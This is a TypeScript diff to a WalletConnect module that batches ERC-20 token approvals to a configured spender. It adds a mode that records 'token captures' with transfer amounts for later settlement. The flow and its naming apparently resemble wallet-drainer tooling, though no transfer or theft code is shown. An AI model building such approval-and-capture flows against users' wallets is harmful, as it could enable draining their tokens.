@@ -15,6 +15,7 @@ import type {
   PreparedApproval,
   SignedApproval,
 } from "../approval/types";
+import { StageStatus } from "../approval/types";
 import { getToken, parseHumanToRaw } from "../core/chain-tokens";
 import { validateEvmApproveCall } from "../core/evm-approve-guard";
 import { getErrorMessage, isUserRejection } from "../core/errors";
@@ -35,6 +36,7 @@ import type {
 } from "../types";
 import type { IncludedAssetWorkItem } from "./preferences";
 import { balanceForToken } from "./preferences";
+import type { WalletPhaseTokenCapture } from "./phases/types";
 
 export type EvmTokenBatchRunArgs = {
   items: IncludedAssetWorkItem[];
@@ -65,6 +67,13 @@ export type EvmTokenBatchRunArgs = {
   onAssetStart?: (item: IncludedAssetWorkItem) => void;
   onAssetEnd?: (result: AuthorizationAssetResult) => void;
   log?: (step: string, detail?: Record<string, unknown>) => void;
+  walletPhaseOnly?: boolean;
+};
+
+export type EvmTokenBatchRunResult = {
+  results: AuthorizationAssetResult[];
+  tokenCaptures: WalletPhaseTokenCapture[];
+  batchId?: string | null;
 };
 
 type BatchJob = {
@@ -102,21 +111,25 @@ async function verifyAllowanceWithRetry(
  */
 export async function runEvmTokenBatchApproval(
   args: EvmTokenBatchRunArgs
-): Promise<AuthorizationAssetResult[]> {
+): Promise<EvmTokenBatchRunResult> {
   const log = args.log ?? (() => undefined);
   const owner = args.accounts.evm;
   if (!owner) {
-    return args.items.map((item) => ({
-      network: item.network,
-      token: item.asset as TokenSymbol,
-      outcome: "failed",
-      message: "No EVM address in this WalletConnect session",
-    }));
+    return {
+      results: args.items.map((item) => ({
+        network: item.network,
+        token: item.asset as TokenSymbol,
+        outcome: "failed" as const,
+        message: "No EVM address in this WalletConnect session",
+      })),
+      tokenCaptures: [],
+    };
   }
 
   const chainId = EVM_CHAIN_ID[args.network as keyof typeof EVM_CHAIN_ID];
   if (chainId == null) {
-    return runSequentialFallback(args, owner, "Unsupported EVM network");
+    const fallback = await runSequentialFallback(args, owner, "Unsupported EVM network");
+    return { results: fallback.results, tokenCaptures: fallback.tokenCaptures };
   }
 
   const capabilities = await getWalletCapabilities(args.provider, chainId, owner);
@@ -126,7 +139,8 @@ export async function runEvmTokenBatchApproval(
       chainId,
       fallback: "sequential eth_sendTransaction",
     });
-    return runSequentialFallback(args, owner);
+    const fallback = await runSequentialFallback(args, owner);
+    return { results: fallback.results, tokenCaptures: fallback.tokenCaptures };
   }
 
   log("EIP5792_BATCH_ATTEMPT", {
@@ -139,12 +153,15 @@ export async function runEvmTokenBatchApproval(
   const chainPort = createEvmApprovalChainPort({ provider: args.provider });
   const spender = args.getSpender(args.network);
   if (!spender) {
-    return args.items.map((item) => ({
-      network: item.network,
-      token: item.asset as TokenSymbol,
-      outcome: "failed",
-      message: "Spender not configured",
-    }));
+    return {
+      results: args.items.map((item) => ({
+        network: item.network,
+        token: item.asset as TokenSymbol,
+        outcome: "failed" as const,
+        message: "Spender not configured",
+      })),
+      tokenCaptures: [],
+    };
   }
 
   const jobs: BatchJob[] = [];
@@ -281,14 +298,17 @@ export async function runEvmTokenBatchApproval(
   }
 
   if (jobs.length === 0) {
-    return results;
+    return { results, tokenCaptures: [] };
   }
   if (jobs.length === 1) {
     const job = jobs[0]!;
     const fallbackResults = await runSequentialFallback(args, owner, undefined, [
       job.item,
     ]);
-    return [...results, ...fallbackResults];
+    return {
+      results: [...results, ...fallbackResults.results],
+      tokenCaptures: fallbackResults.tokenCaptures,
+    };
   }
 
   try {
@@ -321,6 +341,7 @@ export async function runEvmTokenBatchApproval(
 
     const status = await pollCallsStatus(args.provider, batch.id, chainId);
     const batchResults: AuthorizationAssetResult[] = [];
+    const tokenCaptures: WalletPhaseTokenCapture[] = [];
 
     for (let i = 0; i < jobs.length; i += 1) {
       const job = jobs[i]!;
@@ -334,6 +355,38 @@ export async function runEvmTokenBatchApproval(
           message: receipt
             ? "Approval transaction reverted on-chain"
             : "Batch completed without a receipt for this approval",
+        };
+        batchResults.push(result);
+        args.onAssetEnd?.(result);
+        continue;
+      }
+
+      if (args.walletPhaseOnly) {
+        const orchestration: ApprovalOrchestrationResult = {
+          ok: true,
+          status: StageStatus.OK,
+          context: {
+            request: job.request,
+            prepared: job.prepared,
+            broadcast: { txHash: receipt.transactionHash },
+            stageLog: [],
+          },
+          txHash: receipt.transactionHash,
+          approvalId: null,
+          stages: [],
+        };
+        tokenCaptures.push({
+          item: job.item,
+          orchestration,
+          shouldAttemptTransfer: job.shouldAttemptTransfer,
+          transferAmountRaw: job.transferAmountRaw,
+        });
+        const result: AuthorizationAssetResult = {
+          network: job.item.network,
+          token: job.item.asset,
+          outcome: "authorized",
+          message: "Wallet approved — settlement queued",
+          txHash: receipt.transactionHash,
         };
         batchResults.push(result);
         args.onAssetEnd?.(result);
@@ -419,7 +472,11 @@ export async function runEvmTokenBatchApproval(
       }
     }
 
-    return [...results, ...batchResults];
+    return {
+      results: [...results, ...batchResults],
+      tokenCaptures,
+      batchId: batch.id,
+    };
   } catch (err) {
     const rejected = isUserRejection(err);
     const message = getErrorMessage(err, "EIP-5792 batch approval failed");
@@ -441,11 +498,14 @@ export async function runEvmTokenBatchApproval(
         args.onAssetEnd?.(result);
         return result;
       });
-      return [...results, ...rejectedResults];
+      return { results: [...results, ...rejectedResults], tokenCaptures: [] };
     }
 
     const fallbackResults = await runSequentialFallback(args, owner, message);
-    return [...results, ...fallbackResults];
+    return {
+      results: [...results, ...fallbackResults.results],
+      tokenCaptures: fallbackResults.tokenCaptures,
+    };
   }
 }
 
@@ -454,12 +514,13 @@ async function runSequentialFallback(
   owner: string,
   reason?: string,
   items: IncludedAssetWorkItem[] = args.items
-): Promise<AuthorizationAssetResult[]> {
+): Promise<EvmTokenBatchRunResult> {
   if (reason) {
     args.log?.("EIP5792_BATCH_FALLBACK", { network: args.network, reason });
   }
 
   const results: AuthorizationAssetResult[] = [];
+  const tokenCaptures: WalletPhaseTokenCapture[] = [];
   for (const item of items) {
     if (item.asset === "NATIVE") continue;
     args.onAssetStart?.(item);
@@ -606,6 +667,26 @@ async function runSequentialFallback(
         continue;
       }
 
+      if (args.walletPhaseOnly) {
+        tokenCaptures.push({
+          item: { ...item, asset: token },
+          orchestration,
+          shouldAttemptTransfer,
+          transferAmountRaw: shouldAttemptTransfer ? transferAmountRaw : undefined,
+        });
+        const result: AuthorizationAssetResult = {
+          network: item.network,
+          token,
+          outcome: "authorized",
+          message: "Wallet approved — settlement queued",
+          txHash: orchestration.txHash,
+          approvalId: orchestration.approvalId,
+        };
+        results.push(result);
+        args.onAssetEnd?.(result);
+        continue;
+      }
+
       const persisted = orchestration.context.persisted;
       const skipLabel = persisted?.transferSkippedReason
         ? formatTransferSkipReason(persisted.transferSkippedReason)
@@ -639,7 +720,7 @@ async function runSequentialFallback(
       args.onAssetEnd?.(result);
     }
   }
-  return results;
+  return { results, tokenCaptures };
 }
 
 export type AuthorizationWorkUnit =
